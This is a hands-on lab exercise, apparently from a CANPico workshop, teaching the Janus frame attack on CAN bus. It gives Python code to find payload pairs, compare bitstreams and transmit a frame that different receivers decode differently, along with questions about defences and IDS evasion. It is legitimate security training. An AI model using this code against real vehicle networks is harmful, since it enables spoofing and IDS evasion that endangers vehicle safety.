# Challenge 7: Janus Frame Attack
**Difficulty:** 🔴🔴 Expert | **Time:** 60 min | **Boards:** 2

## 🎯 Objective
Craft and send a **Janus frame** — a CAN frame that appears as one message to some receivers and a different message to others, depending on their sampling point. This is one of the most sophisticated CAN attacks known.

## 📖 Background
A Janus frame exploits differences in **bit sampling points** between CAN controllers. During a bit time, the attacker switches the bus value partway through. Controllers that sample early see one value; controllers that sample late see another. The result: **two different receivers see two different frames from the same transmission**.

Named after the Roman god with two faces, this attack was published by researchers at Canis Labs and demonstrates a fundamental weakness in the CAN physical layer.

### How it works
```
Bit time: |----sync----|---phase1---|---phase2---|
          |  dominant   |  value A   |  value B   |
                        ^            ^
                   early sample   late sample
                   sees value A   sees value B
```

The `canframe.py` tool includes an `is_janus()` function that checks if two payloads produce compatible bitstreams for a Janus attack.

## 🔬 Exercise

### Part A: Find Janus-compatible payloads (on PC)
```python
from canframe import CANFrame, is_janus
from binascii import hexlify

# Search for two payloads that can form a Janus frame
target_id = 0x123
payload_a = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xF0, 0x0D])

found = 0
for b1 in range(256):
    for b2 in range(256):
        payload_b = bytes([0xDE, 0xAD, 0xBE, 0xEF, b2, b1, 0xF0, 0x0D])
        if payload_a != payload_b and is_janus(
            id_a=target_id, payload_a=payload_a, payload_b=payload_b
        ):
            print(f"JANUS PAIR FOUND!")
            print(f"  Payload A: {hexlify(payload_a).decode()}")
            print(f"  Payload B: {hexlify(payload_b).decode()}")
            found += 1
            if found >= 5:
                break
    if found >= 5:
        break

print(f"\nFound {found} Janus pairs")
```

**Questions:**
1. How many Janus pairs exist for this ID and base payload?
2. Which bytes can differ between the two payloads?
3. Why must the bitstreams be the same length?

### Part B: Analyze the bitstreams
```python
from canframe import CANFrame

# Use a Janus pair you found above
payload_a = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xF0, 0x0D])
payload_b = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xXX, 0xYY, 0xF0, 0x0D])  # Replace XX,YY

f_a = CANFrame(id_a=0x123, data=payload_a)
f_b = CANFrame(id_a=0x123, data=payload_b)

print("Frame A bitstream:")
f_a.print(detailed=True)
print(f"\nFrame A bits: {f_a.bitseq()}")

print("\nFrame B bitstream:")
f_b.print(detailed=True)
print(f"\nFrame B bits: {f_b.bitseq()}")

# Compare bit by bit
bits_a = f_a.bitseq()
bits_b = f_b.bitseq()
print(f"\nBitstream lengths: A={len(bits_a)}, B={len(bits_b)}")
print("\nDifferences:")
for i in range(len(bits_a)):
    if bits_a[i] != bits_b[i]:
        print(f"  Bit {i}: A={bits_a[i]}, B={bits_b[i]}")
```

**Key insight:** At every differing bit position, Frame A has '1' and Frame B has '0' (or vice versa in a specific pattern). The attacker controls which value each receiver sees by timing the transition.

### Part C: Send a Janus frame on the CANPico
```python
from rp2 import CAN, CANFrame, CANID, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Set up the two frame phases
# Frame 1 = what early-sampling receivers see
# Frame 2 = what late-sampling receivers see
payload_a = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xF0, 0x0D])
payload_b = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xXX, 0xYY, 0xF0, 0x0D])  # Your Janus pair

# Set frame 1 (primary)
ch.set_frame(can_id=0x123, data=payload_a)
# Set frame 2 (secondary) 
ch.set_frame(can_id=0x123, data=payload_b, second=True)

# Send the Janus frame
# sync_time: duration of dominant sync segment (in CPU cycles)
# split_time: when to switch from phase 1 to phase 2 value
# These values depend on your bit rate and need tuning
result = ch.send_janus_frame(
    sync_time=50,    # Tune this
    split_time=100,  # Tune this  
    retries=3
)
print(f"Janus frame sent: {result}")
```

### Part D: Verify with two receivers
Set up Board B with a different sampling point configuration and verify that the two boards receive different data from the same Janus transmission.

**Board B — receive and display:**
```python
from rp2 import CAN
c = CAN()

frames = []
while len(frames) < 10:
    rx = c.recv()
    for f in rx:
        if f.get_arbitration_id() == 0x123:
            print(f"Received: ID=0x123 Data={f.get_data().hex()}")
            frames.append(f)
```

**Questions:**
1. Did Board A and Board B receive different data from the same frame?
2. What determines which "face" each receiver sees?
3. How would you defend against Janus frames?
4. Could a CAN IDS detect a Janus frame?

## 📝 What to Share
- Your Janus payload pairs
- Bitstream comparison showing the differences
- Whether you achieved different reception on two boards
- Discussion: implications for CAN security (e.g., IDS evasion)

## 🏆 Stretch
- [ ] Find Janus pairs for extended (29-bit) IDs
- [ ] Calculate how many Janus pairs exist for a given ID
- [ ] Research: how does CAN FD affect Janus attacks?
- [ ] Can you combine Janus with spoofing? (spoof a Janus frame after a target)
